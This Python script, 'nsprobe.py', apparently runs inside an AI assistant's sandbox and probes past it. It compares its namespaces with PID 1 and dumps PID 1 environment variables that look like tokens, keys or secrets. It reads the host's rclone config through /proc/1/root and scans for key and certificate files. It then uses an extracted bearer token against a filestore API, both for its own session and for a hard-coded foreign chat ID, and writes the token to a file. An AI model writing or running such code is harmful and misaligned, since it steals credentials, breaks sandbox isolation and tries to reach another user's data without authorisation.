#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""nsprobe.py -- inspect PID 1's namespace/root for the real filestore config."""
import os, re, http.client as hc

OUT = "/mnt/user-data/outputs/nsprobe.txt"
FOREIGN = "claude_chat_01BG7VUnxm4QuArCfCzLZapE"
R = []
def rec(s): R.append(str(s)); print("[n]", s, flush=True)
def rdo(p, d=""):
    try:
        with open(p, "r", errors="replace") as f: return f.read()
    except Exception: return d
def sz(p):
    try: return os.path.getsize(p)
    except Exception: return -1

CFG = "/dev/shm/rclone-boot/config.json"
m = re.search(r"claude_chat_[A-Za-z0-9]+", rdo(CFG)); SELF = m.group(0) if m else ""
rec("SELF=%s FOREIGN=%s" % (SELF, FOREIGN))

rec("=== NAMESPACES ===")
for n in ("mnt", "net", "pid", "user", "ipc", "uts"):
    try: a = os.readlink("/proc/self/ns/%s" % n)
    except Exception: a = "?"
    try: b = os.readlink("/proc/1/ns/%s" % n)
    except Exception: b = "?"
    rec("NS %s self=%s pid1=%s same=%s" % (n, a, b, a == b))

rec("=== PID1 ENV ===")
rec("ENVIRON_SIZE=%d" % sz("/proc/1/environ"))
env = rdo("/proc/1/environ", "")
rec("ENVIRON_KEYS=%s" % [x.split("=")[0] for x in env.split("\x00") if "=" in x])
for kv in env.split("\x00"):
    if "=" in kv:
        k, _, v = kv.partition("=")
        if re.search(r"TOKEN|AUTH|KEY|SECRET|JWT|FILESTORE|CRED", k, re.I):
            rec("ENVHIT %s len=%d val=%s" % (k, len(v), v[:300]))

rec("=== PID1 ROOT VIEW ===")
for p in ("/proc/1/root/dev/shm/rclone-boot",
          "/proc/1/root/dev/shm/rclone-boot/config.json",
          "/proc/1/root/dev/shm/rclone-boot/state",
          "/proc/1/root/tmp"):
    rec("STAT %s exists=%s size=%d" % (p, os.path.exists(p), sz(p)))
cfg1 = rdo("/proc/1/root/dev/shm/rclone-boot/config.json", "")
rec("PID1_CFG_LEN=%d" % len(cfg1))
rec("PID1_CFG=%s" % cfg1.replace("\n", "")[:2000])
rec("PID1_CFG_DIFFERS=%s" % (cfg1.strip() != rdo(CFG).strip()))
for dp, dns, fns in os.walk("/proc/1/root/dev/shm/rclone-boot"):
    for f in fns:
        rec("PID1_FILE %s/%s size=%d" % (dp, f, sz(os.path.join(dp, f))))

rec("=== PID1 FDs ===")
try:
    for fd in sorted(os.listdir("/proc/1/fd")):
        try: rec("FD1 %s -> %s" % (fd, os.readlink("/proc/1/fd/%s" % fd)))
        except Exception: pass
except Exception as e: rec("FD1_ERR=%s" % e)

rec("=== CERT SCAN ===")
for base in ("/proc/1/root/etc", "/etc", "/root", "/dev/shm"):
    for dp, _, fns in os.walk(base):
        if dp.count("/") > 6: continue
        for f in fns:
            if f.endswith((".pem", ".crt", ".key")):
                rec("CERT %s/%s" % (dp, f))

# token extraction from PID1 config
tok = ""
for k in ("auth_token", "token"):
    mm = re.search(r'"%s"\s*:\s*"([^"]+)"' % k, cfg1)
    if mm: tok = mm.group(1); break
rec("PID1_TOKEN_FOUND=%s len=%d" % (bool(tok), len(tok)))

def probe(fsid, t):
    try:
        c = hc.HTTPSConnection("api.anthropic.com", timeout=8)
        c.request("GET", "/v1/filestore/fs/%s" % fsid, headers={"Authorization": "Bearer " + t})
        r = c.getresponse(); b = r.read(140).decode("latin1", "replace"); c.close()
        return "%d %s" % (r.status, b.replace("\n", " ")[:100])
    except Exception as e: return "ERR:%s" % e

if tok:
    rec("TEST_SELF=%s" % probe(SELF, tok))
    rec("TEST_FOREIGN=%s" % probe(FOREIGN, tok))
    rec("TOKEN=%s" % tok)

rec("VERDICT=%s" % ("TOKEN_FOUND" if tok else "NO_TOKEN_IN_PID1"))

os.makedirs(os.path.dirname(OUT), exist_ok=True)
open(OUT, "w").write("\n".join(R) + "\n")
print("report ->", OUT)